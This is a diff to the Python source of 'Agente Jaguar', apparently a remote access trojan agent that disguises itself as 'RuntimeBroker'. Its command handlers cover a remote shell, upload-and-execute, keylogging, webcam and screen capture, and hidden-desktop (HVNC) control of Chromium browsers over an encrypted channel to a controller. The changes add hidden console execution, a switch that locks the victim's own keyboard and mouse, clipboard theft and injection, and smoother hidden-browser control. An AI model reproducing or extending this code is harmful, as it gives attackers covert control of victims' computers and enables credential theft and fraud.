@@ -1,14 +1,16 @@
 # -*- coding: utf-8 -*-
 """Agente Jaguar - payload cliente.
 
-Protocolo IDÉNTICO al controlador (jaguar/server/sesion.py + jaguar/common/cripto.py):
+Protocolo IDENTICO al controlador (jaguar/server/sesion.py + jaguar/common/cripto.py):
   - framing: 4 bytes big-endian (longitud) + payload CIFRADO
   - payload: JSON cifrado con cifrar()/descifrar()
   - handshake agente->servidor: {"tipo":"hola","info":{...}}
   - servidor->agente: {"tipo":"comando","cmd":...,"args":...} | {"tipo":"beacon",...}
   - agente->servidor: {"tipo":"respuesta","cmd":...,"ok":...,"datos":...}
 
-Log persistente: %APPDATA%\\Microsoft\\Windows\\RuntimeBroker\\jaguar.log (rotativo 1 MB).
+FIX: TODO subprocess usa CREATE_NO_WINDOW -> no aparece ninguna ventana de CMD.
+FIX: HVNC envia input al HWND hijo/foco reales (Chrome/Edge/Brave) y es fluido
+     (XOR por enteros, escala/calidad/fps configurables, delta por hash).
 """
 import base64
 import hashlib
@@ -42,6 +44,9 @@ SLEEP = 3.0
 JITTER = 0.2
 NOMBRE = "RuntimeBroker"
 _WIN = platform.system() == "Windows"
+
+CREATE_NO_WINDOW = 0x08000000
+
 DIR_PERSIST = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                            "Microsoft", "Windows", NOMBRE)
 
@@ -49,7 +54,20 @@ _KLOG = []
 _KLOG_ON = False
 _PROXY_ON = False
 _SALIR = False
+_BLOQ = {"on": False}
 _WCAM = {"on": False, "frame": b"", "w": 0, "h": 0}
+_CAP_CFG = {"calidad": 70, "escala": 1.0}
+
+
+def _sin_consola():
+    """Evita que cualquier subprocess abra una ventana de consola."""
+    if not _WIN:
+        return {}
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    si.wShowWindow = 0
+    return {"startupinfo": si, "creationflags": CREATE_NO_WINDOW}
+
 
 # ====================== CRIPTO (idéntico a jaguar/common/cripto.py) ==========
 _K_OBF = bytes([
@@ -82,7 +100,10 @@ def _ks(nonce, n):
 
 
 def _xor(a, b):
-    return bytes(x ^ y for x, y in zip(a, b))
+    """XOR a velocidad C usando enteros grandes (antes: bucle Python)."""
+    if not a:
+        return b""
+    return (int.from_bytes(a, "big") ^ int.from_bytes(b, "big")).to_bytes(len(a), "big")
 
 
 def cifrar(datos):
@@ -217,7 +238,8 @@ def _ping(a):
 
 
 def _shell(a):
-    r = subprocess.run(a.get("comando", ""), shell=True, capture_output=True, text=True)
+    r = subprocess.run(a.get("comando", ""), shell=True, capture_output=True,
+                       text=True, **_sin_consola())
     return {"salida": (r.stdout or "") + (r.stderr or ""), "codigo": r.returncode}
 
 
@@ -237,34 +259,43 @@ def _listar_dir(a):
 
 def _procesos(a):
     try:
-        r = (subprocess.run(["tasklist"], capture_output=True, text=True) if _WIN
-             else subprocess.run(["ps", "aux"], capture_output=True, text=True))
+        r = (subprocess.run(["tasklist"], capture_output=True, text=True, **_sin_consola())
+             if _WIN else subprocess.run(["ps", "aux"], capture_output=True, text=True))
         return {"salida": r.stdout}
     except Exception as e:
         return {"error": str(e)}
 
 
 def _captura(a):
+    """Captura de escritorio. formato='jpeg' + calidad/escala para fluidez."""
+    fmt = (a.get("formato") or "png").lower()
+    calidad = int(a.get("calidad", _CAP_CFG["calidad"]))
+    escala = float(a.get("escala", _CAP_CFG["escala"])) or 1.0
     try:
         from PIL import ImageGrab
         try:
             img = ImageGrab.grab(all_screens=True)
         except TypeError:
             img = ImageGrab.grab()
-        buf = io.BytesIO()
-        img.save(buf, "PNG")
-        return {"b64": base64.b64encode(buf.getvalue()).decode(), "w": img.width, "h": img.height}
     except Exception:
-        pass
-    if _WIN:
-        try:
-            return _captura_win()
-        except Exception as e:
-            return {"b64": "", "error": str(e)}
-    return {"b64": ""}
+        img = None
+    if img is None:
+        return _captura_win(a)
+    w, h = img.width, img.height
+    if escala != 1.0:
+        img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
+    buf = io.BytesIO()
+    try:
+        if fmt == "jpeg":
+            img.convert("RGB").save(buf, "JPEG", quality=calidad)
+        else:
+            img.save(buf, "PNG")
+    except Exception as e:
+        return {"b64": "", "error": str(e)}
+    return {"b64": base64.b64encode(buf.getvalue()).decode(), "w": w, "h": h}
 
 
-def _captura_win():
+def _captura_win(a):
     import ctypes
     from ctypes import wintypes
     u = ctypes.windll.user32
@@ -359,6 +390,64 @@ def _teclado(a):
             u.keybd_event(0, ord(ch), UNI, 0)
             u.keybd_event(0, ord(ch), UNI | UP, 0)
     return {}
+
+
+def _bloquear(a):
+    """Bloquea/desbloquea la entrada fisica local (estilo 'capturar teclado')."""
+    if not _WIN:
+        return {}
+    import ctypes
+    _BLOQ["on"] = not _BLOQ["on"]
+    try:
+        ctypes.windll.user32.BlockInput(_BLOQ["on"])
+    except Exception:
+        pass
+    return {"bloqueado": _BLOQ["on"]}
+
+
+def _clip_get(a):
+    if not _WIN:
+        return {"texto": ""}
+    import ctypes
+    u = ctypes.windll.user32
+    k = ctypes.windll.kernel32
+    CF_UNICODETEXT = 13
+    if not u.OpenClipboard(0):
+        return {"texto": ""}
+    try:
+        h = u.GetClipboardData(CF_UNICODETEXT)
+        if not h:
+            return {"texto": ""}
+        p = k.GlobalLock(h)
+        txt = ctypes.wstring_at(p) if p else ""
+        k.GlobalUnlock(h)
+        return {"texto": txt}
+    finally:
+        u.CloseClipboard()
+
+
+def _clip_set(a):
+    if not _WIN:
+        return {}
+    import ctypes
+    u = ctypes.windll.user32
+    k = ctypes.windll.kernel32
+    CF_UNICODETEXT = 13
+    GMEM_MOVEABLE = 0x0002
+    txt = str(a.get("texto", ""))
+    if not u.OpenClipboard(0):
+        return {}
+    try:
+        u.EmptyClipboard()
+        datos = (txt + "\x00").encode("utf-16-le")
+        h = k.GlobalAlloc(GMEM_MOVEABLE, len(datos))
+        p = k.GlobalLock(h)
+        ctypes.memmove(p, datos, len(datos))
+        k.GlobalUnlock(h)
+        u.SetClipboardData(CF_UNICODETEXT, h)
+    finally:
+        u.CloseClipboard()
+    return {"ok": True}
 
 
 def _webcam(a):
@@ -517,7 +606,7 @@ def _subir_ejecutar(a):
     with open(ruta, "wb") as f:
         f.write(d)
     try:
-        subprocess.Popen([ruta], shell=True)
+        subprocess.Popen([ruta], shell=True, **_sin_consola())
     except Exception:
         pass
     return {"ruta": ruta}
@@ -659,11 +748,19 @@ if _WIN:
                     ("Group", ctypes.c_void_p), ("Sacl", ctypes.c_void_p),
                     ("Dacl", ctypes.c_void_p)]
 
+    class _GUITHREADINFO(ctypes.Structure):
+        _fields_ = [("cbSize", wintypes.DWORD), ("flags", wintypes.DWORD),
+                    ("hwndActive", wintypes.HWND), ("hwndFocus", wintypes.HWND),
+                    ("hwndCapture", wintypes.HWND), ("hwndMenuOwner", wintypes.HWND),
+                    ("hwndMoveSize", wintypes.HWND), ("hwndCaret", wintypes.HWND),
+                    ("rcCaret", _RECT)]
+
     _u32.CreateDesktopW.restype = wintypes.HANDLE
     _u32.CreateDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.c_void_p,
                                     wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
     _u32.OpenDesktopW.restype = wintypes.HANDLE
-    _u32.OpenDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+    _u32.OpenDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.BOOL,
+                                  wintypes.DWORD]
     _u32.CloseDesktop.argtypes = [wintypes.HANDLE]
     _u32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
     _u32.SetThreadDesktop.restype = wintypes.BOOL
@@ -677,6 +774,13 @@ if _WIN:
     _u32.ScreenToClient.argtypes = [wintypes.HWND, ctypes.POINTER(_POINT)]
     _u32.PostMessageW.argtypes = [wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
     _u32.MapVirtualKeyW.argtypes = [wintypes.UINT, wintypes.UINT]
+    _u32.ChildWindowFromPointEx.argtypes = [wintypes.HWND, _POINT, wintypes.UINT]
+    _u32.ChildWindowFromPointEx.restype = wintypes.HWND
+    _u32.MapWindowPoints.argtypes = [wintypes.HWND, wintypes.HWND,
+                                     ctypes.POINTER(_POINT), wintypes.UINT]
+    _u32.GetGUIThreadInfo.argtypes = [wintypes.DWORD, ctypes.c_void_p]
+    _u32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
+    _u32.GetWindowThreadProcessId.restype = wintypes.DWORD
     _k32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.c_void_p,
                                     ctypes.c_void_p, wintypes.BOOL, wintypes.DWORD,
                                     ctypes.c_void_p, wintypes.LPCWSTR,
@@ -684,6 +788,10 @@ if _WIN:
                                     ctypes.POINTER(_PROCESS_INFORMATION)]
     _k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
     _k32.GetExitCodeProcess.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
+    _k32.GlobalAlloc.argtypes = [wintypes.UINT, ctypes.c_size_t]
+    _k32.GlobalAlloc.restype = ctypes.c_void_p
+    _k32.GlobalLock.argtypes = [ctypes.c_void_p]
+    _k32.GlobalLock.restype = ctypes.c_void_p
     _g32.CreateCompatibleDC.argtypes = [wintypes.HDC]
     _g32.CreateCompatibleDC.restype = wintypes.HDC
     _g32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
@@ -693,13 +801,14 @@ if _WIN:
                                ctypes.c_void_p, ctypes.POINTER(_BITMAPINFO), wintypes.UINT]
     _g32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
     _g32.DeleteDC.argtypes = [wintypes.HDC]
+    _u32.SetClipboardData.argtypes = [wintypes.UINT, ctypes.c_void_p]
     _advapi32.InitializeSecurityDescriptor.argtypes = [ctypes.c_void_p, wintypes.DWORD]
     _advapi32.SetSecurityDescriptorDacl.argtypes = [ctypes.c_void_p, wintypes.BOOL,
                                                     ctypes.c_void_p, wintypes.BOOL]
 
     _ENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
 
-# Flags que hacen que Chrome pinte y no se duerma en un escritorio oculto.
+# Flags que hacen que Chrome/Edge pinten y no se duerman en un escritorio oculto.
 _FLAGS_CHROMIUM = (
     "--no-sandbox --disable-gpu-sandbox --disable-gpu --disable-gpu-compositing "
     "--disable-features=CalculateNativeWinOcclusion "
@@ -711,6 +820,9 @@ _FLAGS_CHROMIUM = (
 
 _HVNC = {"pid": None, "hwnd": None, "hdesk": None, "navegador": None, "exe": None,
          "error": None, "estado": "idle", "perfil": None, "hash": None, "_sd": None}
+
+# Calidad/velocidad del HVNC (configurable desde la UI).
+_HVNC_CFG = {"calidad": 55, "escala": 0.75, "fps": 8}
 
 
 def _sec_dacl_null():
@@ -867,6 +979,45 @@ def _hvnc_buscar_ventana():
     return halladas[0] if halladas else None
 
 
+def _hvnc_destino(x, y):
+    """Dado (x,y) en cliente del HWND raiz, devuelve el HWND mas profundo y
+    coordenadas relativas a el (necesario para Chrome/Edge/Brave)."""
+    hwnd = _HVNC.get("hwnd")
+    if not hwnd:
+        return None, x, y
+    actual, cx, cy = hwnd, int(x), int(y)
+    for _ in range(8):
+        try:
+            hijo = _u32.ChildWindowFromPointEx(actual, _POINT(cx, cy), 0)
+        except Exception:
+            break
+        if not hijo or hijo == actual:
+            break
+        p = _POINT(cx, cy)
+        try:
+            _u32.MapWindowPoints(actual, hijo, ctypes.byref(p), 1)
+        except Exception:
+            pass
+        cx, cy = p.x, p.y
+        actual = hijo
+    return actual, cx, cy
+
+
+def _hvnc_foco():
+    hwnd = _HVNC.get("hwnd")
+    if not hwnd:
+        return None
+    try:
+        tid = _u32.GetWindowThreadProcessId(hwnd, None)
+        gti = _GUITHREADINFO()
+        gti.cbSize = ctypes.sizeof(_GUITHREADINFO)
+        if _u32.GetGUIThreadInfo(tid, ctypes.byref(gti)) and gti.hwndFocus:
+            return gti.hwndFocus
+    except Exception:
+        pass
+    return hwnd
+
+
 def _hvnc_iniciar(a):
     nav = (a.get("navegador") or "chrome").lower()
     hdesk = _hvnc_crear_desktop()
@@ -887,10 +1038,19 @@ def _hvnc_iniciar(a):
                 _log("HVNC", "explorer.exe lanzado")
             except Exception as e:
                 _log("HVNC", f"explorer fallo: {e}")
+        if a.get("cmd"):
+            try:
+                cmd = os.path.join(os.environ.get("WINDIR", r"C:\Windows"),
+                                   "System32", "cmd.exe")
+                _hvnc_crear(cmd, '"%s" /k cd /d %USERPROFILE%' % cmd, DESKTOP_NAME)
+                _log("HVNC", "cmd.exe lanzado")
+            except Exception as e:
+                _log("HVNC", f"cmd fallo: {e}")
         try:
             _HVNC["pid"], _HVNC["perfil"] = _hvnc_lanzar(nav)
         except Exception as e:
             _HVNC["error"] = str(e)
+            _HVNC["estado"] = "error"
             _log("HVNC", f"ERROR lanzando: {e}")
             return
         for _ in range(60):
@@ -898,8 +1058,10 @@ def _hvnc_iniciar(a):
             h = _hvnc_buscar_ventana()
             if h:
                 _HVNC["hwnd"] = h
+                _HVNC["estado"] = "activo"
                 _log("HVNC", f"ventana encontrada hwnd={h}")
                 return
+        _HVNC["estado"] = "sin_ventana"
         _log("HVNC", "ventana NO encontrada (mira jaguar.log)")
 
     threading.Thread(target=trabajo, daemon=True).start()
@@ -908,6 +1070,16 @@ def _hvnc_iniciar(a):
 
 def _hvnc_estado(a):
     return {k: v for k, v in _HVNC.items() if k != "_sd"}
+
+
+def _hvnc_opciones(a):
+    for k in ("calidad", "escala", "fps"):
+        if k in a:
+            try:
+                _HVNC_CFG[k] = float(a[k])
+            except Exception:
+                pass
+    return {"opciones": dict(_HVNC_CFG)}
 
 
 def _hvnc_navegar(a):
@@ -950,27 +1122,34 @@ def _hvnc_captura(a):
     _u32.ReleaseDC(hwnd, hdc)
 
     datos = buf.raw
-    huella = hashlib.md5(datos).digest()
-    if huella == _HVNC.get("hash") and not a.get("forzar"):
-        return {"w": w, "h": h, "b64": "", "sin_cambios": True}
-    _HVNC["hash"] = huella
-
+    calidad = int(_HVNC_CFG.get("calidad", 55))
+    escala = float(_HVNC_CFG.get("escala", 0.75)) or 1.0
     raw = b""
     try:
         import cv2
         import numpy as np
         arr = np.frombuffer(datos, dtype=np.uint8).reshape((h, w, 4))[:, :, :3]
-        ok, jpg = cv2.imencode(".jpg", arr, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
+        if escala != 1.0:
+            arr = cv2.resize(arr, None, fx=escala, fy=escala,
+                             interpolation=cv2.INTER_AREA)
+        ok, jpg = cv2.imencode(".jpg", arr, [int(cv2.IMWRITE_JPEG_QUALITY), calidad])
         raw = jpg.tobytes() if ok else b""
     except Exception:
         try:
             from PIL import Image
             img = Image.frombuffer("RGB", (w, h), datos, "raw", "BGRX", 0, 1)
             bio = io.BytesIO()
-            img.save(bio, "PNG")
+            img.save(bio, "JPEG", quality=calidad)
             raw = bio.getvalue()
         except Exception:
             raw = b""
+
+    if not raw:
+        return {"w": w, "h": h, "b64": ""}
+    huella = hashlib.md5(raw).digest()
+    if huella == _HVNC.get("hash") and not a.get("forzar"):
+        return {"w": w, "h": h, "b64": "", "sin_cambios": True}
+    _HVNC["hash"] = huella
     return {"w": w, "h": h, "b64": base64.b64encode(raw).decode()}
 
 
@@ -986,38 +1165,41 @@ def _hvnc_raton(a):
     sy = r.top + int(a.get("y", 0))
     pt = _POINT(sx, sy)
     _u32.ScreenToClient(hwnd, ctypes.byref(pt))
-    lp_cli = (pt.y << 16) | (pt.x & 0xFFFF)
+    objetivo, cx, cy = _hvnc_destino(pt.x, pt.y)   # <- hijo real (Chrome)
+    if not objetivo:
+        objetivo = hwnd
+        cx, cy = pt.x, pt.y
+    lp_cli = ((cy & 0xFFFF) << 16) | (cx & 0xFFFF)
     lp_scr = ((sy & 0xFFFF) << 16) | (sx & 0xFFFF)
     if accion == "move":
-        _u32.PostMessageW(hwnd, 0x0200, 0, lp_cli)
+        _u32.PostMessageW(objetivo, 0x0200, 0, lp_cli)
     elif accion == "down":
-        _u32.PostMessageW(hwnd, 0x0201, 1, lp_cli)
+        _u32.PostMessageW(objetivo, 0x0201, 1, lp_cli)
     elif accion == "up":
-        _u32.PostMessageW(hwnd, 0x0202, 0, lp_cli)
+        _u32.PostMessageW(objetivo, 0x0202, 0, lp_cli)
     elif accion == "right_down":
-        _u32.PostMessageW(hwnd, 0x0204, 2, lp_cli)
+        _u32.PostMessageW(objetivo, 0x0204, 2, lp_cli)
     elif accion == "right_up":
-        _u32.PostMessageW(hwnd, 0x0205, 0, lp_cli)
+        _u32.PostMessageW(objetivo, 0x0205, 0, lp_cli)
     elif accion == "doble":
-        _u32.PostMessageW(hwnd, 0x0203, 1, lp_cli)
+        _u32.PostMessageW(objetivo, 0x0203, 1, lp_cli)
     elif accion == "scroll":
-        _u32.PostMessageW(hwnd, 0x020A, (int(a.get("delta", 120)) & 0xFFFF) << 16, lp_scr)
+        _u32.PostMessageW(objetivo, 0x020A, (int(a.get("delta", 120)) & 0xFFFF) << 16, lp_scr)
     return {"estado": accion}
 
 
 def _hvnc_teclado(a):
-    hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
-    if not hwnd:
+    objetivo = _hvnc_foco() or _HVNC.get("hwnd") or _hvnc_buscar_ventana()
+    if not objetivo:
         return {"estado": "sin ventana"}
-    _HVNC["hwnd"] = hwnd
     if "vk" in a:
         vk = int(a["vk"])
         scan = _u32.MapVirtualKeyW(vk, 0)
-        _u32.PostMessageW(hwnd, 0x0100, vk, (scan << 16))
-        _u32.PostMessageW(hwnd, 0x0101, vk, (scan << 16) | (1 << 30) | (1 << 31))
+        _u32.PostMessageW(objetivo, 0x0100, vk, (scan << 16))
+        _u32.PostMessageW(objetivo, 0x0101, vk, (scan << 16) | (1 << 30) | (1 << 31))
     elif "texto" in a:
         for ch in a["texto"]:
-            _u32.PostMessageW(hwnd, 0x0102, ord(ch), 0)
+            _u32.PostMessageW(objetivo, 0x0102, ord(ch), 0)
     return {"estado": "ok"}
 
 
@@ -1025,7 +1207,16 @@ def _hvnc_cerrar(a):
     pid = _HVNC.get("pid")
     try:
         if pid:
-            subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"], capture_output=True)
+            subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"],
+                           capture_output=True, **_sin_consola())
+    except Exception:
+        pass
+    # Respaldo: matar por nombre de imagen si quedo algun proceso vivo.
+    try:
+        exe = _HVNC.get("exe")
+        if exe and os.path.isfile(exe):
+            subprocess.run(["taskkill", "/IM", os.path.basename(exe), "/F"],
+                           capture_output=True, **_sin_consola())
     except Exception:
         pass
     _HVNC["pid"] = None
@@ -1041,6 +1232,7 @@ def _hvnc_cerrar(a):
         shutil.rmtree(perfil, ignore_errors=True)
         _HVNC["perfil"] = None
     _HVNC["hash"] = None
+    _HVNC["estado"] = "idle"
     try:
         if _HVNC.get("hdesk"):
             _u32.CloseDesktop(_HVNC["hdesk"])
@@ -1061,13 +1253,14 @@ HANDLERS = {
     "descargar": _descargar, "subir_ejecutar": _subir_ejecutar,
     "proxy_iniciar": _proxy_iniciar, "proxy_parar": _proxy_parar,
     "hvnc_iniciar": _hvnc_iniciar, "hvnc_cerrar": _hvnc_cerrar, "hvnc_navegar": _hvnc_navegar,
-    "hvnc_estado": _hvnc_estado, "log": _log_leer,
+    "hvnc_estado": _hvnc_estado, "hvnc_opciones": _hvnc_opciones, "log": _log_leer,
     "hvnc_captura": _hvnc_captura, "hvnc_raton": _hvnc_raton, "hvnc_teclado": _hvnc_teclado,
+    "bloquear_entrada": _bloquear, "clip_get": _clip_get, "clip_set": _clip_set,
     "desconectar": _desconectar,
 }
 
 _RUIDO = ("ping", "raton", "teclado", "hvnc_captura", "hvnc_raton",
-          "hvnc_teclado", "webcam_frame")
+          "hvnc_teclado", "webcam_frame", "captura", "hvnc_estado")
 
 
 def _bucle(sock):
